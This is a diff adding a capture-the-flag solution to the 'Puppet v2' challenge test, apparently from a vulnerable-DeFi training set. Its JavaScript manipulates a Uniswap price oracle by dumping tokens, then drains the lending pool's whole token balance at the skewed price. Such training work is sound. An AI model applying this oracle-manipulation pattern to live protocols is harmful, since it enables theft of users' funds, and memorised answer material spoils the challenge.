@@ -82,6 +82,59 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        //create instances
+        const attackExchange = this.uniswapExchange.connect(attacker);
+        const attackRouter = this.uniswapRouter.connect(attacker);
+        const attackWeth = this.weth.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+        const attackPool = this.lendingPool.connect(attacker);
+
+        //Helper function to keep track of balances
+        const logBalances = async(address, name) => {
+            const ethBalance = await ethers.provider.getBalance(address);
+            const wethBalance = await attackWeth.balanceOf(address);
+            const DVTBalance = await attackToken.balanceOf(address);
+            console.log("ETH Balance of", name, ":", ethers.utils.formatEther(ethBalance));
+            console.log("WETH Balance of", name, ":", ethers.utils.formatEther(wethBalance));
+            console.log("DVT Balance of", name, ":", ethers.utils.formatEther(DVTBalance));
+        }
+
+        //swap attacker DVT for WETH on uniswap to devalue DVT
+        await attackToken.approve(attackRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await attackRouter.swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            ethers.utils.parseEther("9.5"),
+            [attackToken.address, attackWeth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp*2,
+        );
+
+        //check balances
+        await logBalances(attacker.address, "attacker");
+        await logBalances(attackExchange.address, "uniswap");
+        await logBalances(attackPool.address, "pool");
+
+        //calculate WETH needed for loan of 1000000 DVT
+        const wethRequired = await attackPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("");
+        console.log("WETH required to get all tokens in pool:", ethers.utils.formatEther(wethRequired));
+        
+        const attackerWeth = await attackWeth.balanceOf(attacker.address)
+        const ethToSwap = ((wethRequired - attackerWeth)/10**18).toString();
+        console.log("ETH required to to swap for WETH:", ethToSwap);
+        await attackWeth.deposit({value: ethers.utils.parseEther(ethToSwap)});
+        console.log("Eth swapped for WETH");
+        await attackWeth.approve(attackPool.address, wethRequired);
+        console.log("Pool approved for spending WETH");
+        await attackPool.borrow(POOL_INITIAL_TOKEN_BALANCE,{gasLimit: 1e6});
+        console.log("Borrow Transaction Completed");
+        
+        await logBalances(attacker.address, "attacker");
+        await logBalances(attackExchange.address, "uniswap");
+        await logBalances(attackPool.address, "pool");
+
+
     });
 
     after(async function () {
